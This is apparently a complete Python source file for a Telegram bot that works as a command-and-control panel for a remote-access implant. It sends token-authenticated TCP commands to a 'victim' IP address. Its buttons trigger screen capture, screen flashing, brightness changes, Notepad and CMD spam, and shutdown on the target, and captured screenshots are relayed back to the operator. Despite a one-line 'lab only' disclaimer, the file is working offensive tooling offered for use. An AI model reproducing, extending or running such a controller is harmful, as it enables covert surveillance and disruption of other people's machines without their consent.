# botpanel_bot.py
# BotPanel — button-driven Telegram control UI with SetTarget (ack) + Screenshot handling.
# Run only in a lab with explicit permission.

import os
import json
import uuid
import socket
import asyncio
import base64
import logging
from typing import Optional

from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    ContextTypes,
    filters,
)

# ---------- CONFIG ----------
TG_BOT_TOKEN = os.getenv("TG_BOT_TOKEN", "YOUR_BOT_TOKEN_HERE")
SHARED_TOKEN = os.getenv("TG_SECRET", "vigneshhacker")
TCP_PORT = int(os.getenv("TCP_PORT", "9999"))
SOCKET_TIMEOUT = 6
# ----------------------------

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Inline keyboard layout (all actions are buttons)
MAIN_BUTTONS = [
    [InlineKeyboardButton("Set Target", callback_data="settarget")],
    [InlineKeyboardButton("Get Target", callback_data="gettarget"),
     InlineKeyboardButton("Clear Target", callback_data="cleartarget")],
    [InlineKeyboardButton("Screenshot 📸", callback_data="screenshot")],
    [InlineKeyboardButton("Crazy Brightness 💡", callback_data="crazybrightness"),
     InlineKeyboardButton("Flash Screen ⚡", callback_data="flashscreen")],
    [InlineKeyboardButton("LOL (Notepad spam) 😂", callback_data="lol"),
     InlineKeyboardButton("CLI Hack (CMD spam) 💻", callback_data="clihack")],
    [InlineKeyboardButton("Stop All ⛔", callback_data="stopall"),
     InlineKeyboardButton("Shutdown (env) 🔴", callback_data="shutdown")],
    [InlineKeyboardButton("Exit", callback_data="exit")],
]

# ---------- TCP communication helpers ----------
def send_tcp_command_sync(target_ip: str, payload: dict, timeout: int = SOCKET_TIMEOUT) -> tuple[bool, Optional[dict], Optional[str]]:
    """
    Blocking TCP send: connect, send JSON newline-terminated, wait for single newline-terminated JSON ack.
    Returns (success_bool, ack_dict_or_None, error_str_or_None)
    """
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((target_ip, TCP_PORT))
        s.sendall((json.dumps(payload) + "\n").encode())

        # read until newline or EOF
        data = b""
        while True:
            try:
                part = s.recv(4096)
            except socket.timeout:
                break
            if not part:
                break
            data += part
            if b"\n" in data:
                line, _, _ = data.partition(b"\n")
                data = line
                break
        s.close()
        if not data:
            return True, None, None  # connected but no ack content
        try:
            ack = json.loads(data.decode(errors="ignore"))
            return True, ack, None
        except Exception as e:
            return True, {"raw": data.decode(errors="ignore")}, None
    except Exception as e:
        return False, None, str(e)

async def tcp_probe_target(target_ip: str) -> tuple[bool, Optional[dict], Optional[str]]:
    """
    Run send_tcp_command_sync in a thread to probe connectivity and get an ack.
    The probe payload uses a minimal command that should produce an ACK or at least a socket response.
    """
    payload = {"token": SHARED_TOKEN, "id": str(uuid.uuid4()), "cmd": "probe_connection", "args": {}}
    return await asyncio.to_thread(send_tcp_command_sync, target_ip, payload, SOCKET_TIMEOUT)

async def send_command_to_target(target_ip: str, cmd_name: str, args: dict | None = None) -> tuple[bool, Optional[dict], Optional[str]]:
    payload = {"token": SHARED_TOKEN, "id": str(uuid.uuid4()), "cmd": cmd_name, "args": args or {}}
    return await asyncio.to_thread(send_tcp_command_sync, target_ip, payload, SOCKET_TIMEOUT)

# ---------- Bot handlers ----------
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "BotPanel — Control panel (buttons only).",
        reply_markup=InlineKeyboardMarkup(MAIN_BUTTONS),
    )

async def menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Open the control panel:", reply_markup=InlineKeyboardMarkup(MAIN_BUTTONS))

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    chat_data = context.chat_data

    # SET TARGET: prompt user to paste IP (we need a single text message for IP)
    if data == "settarget":
        chat_data["awaiting_target"] = True
        await query.message.reply_text("Send the target IP address now (example: 192.168.1.42). This is needed only once to set the target.")
        return

    if data == "gettarget":
        ip = chat_data.get("target_ip")
        if ip:
            await query.message.reply_text(f"Current target: {ip}")
        else:
            await query.message.reply_text("No target set. Use 'Set Target' button.")
        return

    if data == "cleartarget":
        if "target_ip" in chat_data:
            del chat_data["target_ip"]
        await query.message.reply_text("Target cleared.")
        return

    if data == "exit":
        await query.message.reply_text("Exited. Use /menu to show buttons again.")
        return

    # For other actions: ensure we have a target
    target_ip = chat_data.get("target_ip")
    if not target_ip:
        await query.message.reply_text("Target not set. Use 'Set Target' first.")
        return

    # Send the command to victim and show ack/result
    await query.message.reply_text(f"Sending `{data}` to {target_ip}...")

    ok, ack, err = await send_command_to_target(target_ip, data, None)
    if not ok:
        await query.message.reply_text(f"❌ Failed to send `{data}`: {err}")
        return

    # If ack contains screenshot base64, send image to chat
    if isinstance(ack, dict) and ack.get("img_b64"):
        try:
            b64 = ack["img_b64"]
            img_bytes = base64.b64decode(b64)
            # send as photo
            await context.bot.send_photo(chat_id=update.effective_chat.id, photo=img_bytes, caption=f"📸 Screenshot from {target_ip}")
            await query.message.reply_text("✅ Screenshot received and sent.")
            return
        except Exception as e:
            await query.message.reply_text(f"⚠️ Received screenshot but failed to decode/send: {e}")
            return

    # No image — just report ack
    if ack is None:
        await query.message.reply_text(f"✅ `{data}` sent. No ACK body received.")
    else:
        # Format ack nicely
        await query.message.reply_text(f"✅ `{data}` sent. ACK: `{json.dumps(ack)}`")

async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = (update.message.text or "").strip()
    chat_data = context.chat_data

    # If we are awaiting a target IP, accept it here
    if chat_data.get("awaiting_target"):
        chat_data["awaiting_target"] = False
        ip = text
        # simple validation
        import re
        if not re.match(r"^\d{1,3}(\.\d{1,3}){3}$", ip):
            await update.message.reply_text("That doesn't look like a valid IPv4 address. Try again or press 'Set Target' again.")
            return

        await update.message.reply_text(f"Trying to contact target {ip}...")

        ok, ack, err = await tcp_probe_target(ip)
        if not ok:
            await update.message.reply_text(f"❌ Could not reach {ip}: {err}")
            return

        # If we got an ack (even an error ack) consider target confirmed
        context.chat_data["target_ip"] = ip
        await update.message.reply_text(f"✅ Target {ip} set and reachable. ACK: `{json.dumps(ack)}`", reply_markup=InlineKeyboardMarkup(MAIN_BUTTONS))
        return

    # Otherwise guide user
    await update.message.reply_text("Use the buttons. Press /menu to show panel.", reply_markup=InlineKeyboardMarkup(MAIN_BUTTONS))

async def unknown_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Use the buttons or /menu to interact.")

# ---------- Main ----------
def main():
    if not TG_BOT_TOKEN or TG_BOT_TOKEN.startswith("YOUR_"):
        logger.error("Set TG_BOT_TOKEN environment variable first.")
        return

    app = ApplicationBuilder().token(TG_BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("menu", menu))

    app.add_handler(CallbackQueryHandler(button_callback))
    app.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), message_handler))
    app.add_handler(MessageHandler(filters.COMMAND, unknown_command))

    logger.info("Bot started.")
    app.run_polling()

if __name__ == "__main__":
    main()
